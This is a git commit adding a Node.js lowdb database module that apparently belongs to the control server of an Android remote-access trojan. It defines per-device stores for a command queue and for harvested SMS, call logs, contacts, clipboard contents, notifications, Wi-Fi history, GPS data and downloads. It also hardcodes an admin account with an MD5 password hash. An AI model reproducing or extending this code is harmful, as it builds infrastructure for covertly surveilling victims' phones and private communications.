21bdabe0f06810783b5690b8aaa66efe953f05f6
root <root@ip-172-31-17-122.us-east-2.compute.internal>
2020-04-08 12:12:38 +0000

    Linux_Droid

---
+++ includes/databaseGateway.js
@@ -0,0 +1,50 @@
+const
+    lowdb = require('lowdb'),
+    FileSync = require('lowdb/adapters/FileSync'),
+    path = require('path'),
+    adapter = new FileSync('./maindb.json'),
+    db = lowdb(adapter);
+
+db.defaults({
+    admin: {
+        username: 'Linux',
+        password: 'd63b69a72d2b1223503b0af06759d895',
+        loginToken: '',
+        logs: [],
+        ipLog: []
+    },
+    clients: []
+}).write()
+
+class clientdb {
+    constructor(clientID) {
+        let cdb = lowdb(new FileSync('./clientData/' + clientID + '.json'))
+        cdb.defaults({
+            clientID,
+            CommandQue: [],
+            SMSData: [],
+            CallData: [],
+            contacts: [],
+            wifiNow: [],
+            wifiLog: [],
+            clipboardLog: [],
+            notificationLog: [],
+            enabledPermissions: [],
+            apps: [],
+            GPSData: [],
+            GPSSettings: {
+                updateFrequency: 0
+            },
+            downloads: [],
+            currentFolder: []
+        }).write()
+        return cdb;
+    }
+}
+
+module.exports = {
+    maindb: db,
+    clientdb: clientdb,
+};
+
+
